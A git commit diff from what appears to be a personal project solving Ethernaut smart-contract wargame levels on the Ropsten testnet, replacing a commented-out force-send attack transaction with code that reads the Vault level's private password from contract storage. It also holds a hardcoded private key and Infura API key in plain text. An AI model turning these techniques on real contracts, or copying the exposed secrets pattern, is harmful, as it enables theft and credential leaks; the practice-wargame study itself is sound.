5fb6c35378af1733b2604585d1cb09bb006c1298
Matías Barrios <matiasbn@MacBook-Air-de-Matias.local>
2020-01-31 11:17:20 -0300

    feat: vault finished

--- src/index.js
+++ src/index.js
@@ -5,38 +5,41 @@ import { debugEthernaut, debugError } from './config/debug';
 
 const infuraProvider = 'https://ropsten.infura.io/v3/ba374d41ee3f4c65ab05c31c4dd452f6';
 const web3 = new Web3(infuraProvider);
-const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
-const account = web3.eth.accounts.privateKeyToAccount(privateKey);
+// const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
+// const account = web3.eth.accounts.privateKeyToAccount(privateKey);
 
-const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ForceSol.json')));
-const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Telephone.json')));
-const address = '0xeDa14354C69067B1BA2D932627efD343518F820a';
-const solAddress = solArtifact.networks['3'].address;
-debugEthernaut('solAddress', solAddress);
-const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
-const contract = new web3.eth.Contract(artifact.abi, address);
+// const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ForceSol.json')));
+// const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Telephone.json')));
+const address = '0x81D39ce22eeF33cb0063f52DF0495C45B96e7dc9';
+// const solAddress = solArtifact.networks['3'].address;
+// debugEthernaut('solAddress', solAddress);
+// const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
+// const contract = new web3.eth.Contract(artifact.abi, address);
 
 const ethernaut = async () => {
   try {
-    const estimatedGas = await solContract.methods.forceAttack(address).estimateGas();
-    debugEthernaut('estimated gas', estimatedGas);
-    const transactionData = await solContract.methods.forceAttack(address).encodeABI();
-    debugEthernaut('data', transactionData);
-    const transaction = {
-      from: account.address,
-      to: solAddress,
-      data: transactionData,
-      gasLimit: estimatedGas * 100,
-      // gasPrice: utils.toWei(20, 'Gwei'),
-    };
+    // Get the password from the storage of the contract
+    const password = await web3.eth.getStorageAt(address, 1);
+    debugEthernaut('password', password);
+    // const estimatedGas = await solContract.methods.forceAttack(address).estimateGas();
+    // debugEthernaut('estimated gas', estimatedGas);
+    // const transactionData = await solContract.methods.forceAttack(address).encodeABI();
+    // debugEthernaut('data', transactionData);
+    // const transaction = {
+    //   from: account.address,
+    //   to: solAddress,
+    //   data: transactionData,
+    //   gasLimit: estimatedGas * 100,
+    //   // gasPrice: utils.toWei(20, 'Gwei'),
+    // };
 
-    // Sign transaction
-    const signedTx = await account.signTransaction(transaction);
-    debugEthernaut('signedTx:\n', signedTx);
-    const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-    debugEthernaut('txResult:\n', txResult);
-    const contractBalance = await web3.eth.getBalance(address);
-    debugEthernaut('contractBalance', contractBalance);
+    // // Sign transaction
+    // const signedTx = await account.signTransaction(transaction);
+    // debugEthernaut('signedTx:\n', signedTx);
+    // const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+    // debugEthernaut('txResult:\n', txResult);
+    // const contractBalance = await web3.eth.getBalance(address);
+    // debugEthernaut('contractBalance', contractBalance);
   } catch (error) {
     debugError(error);
   }
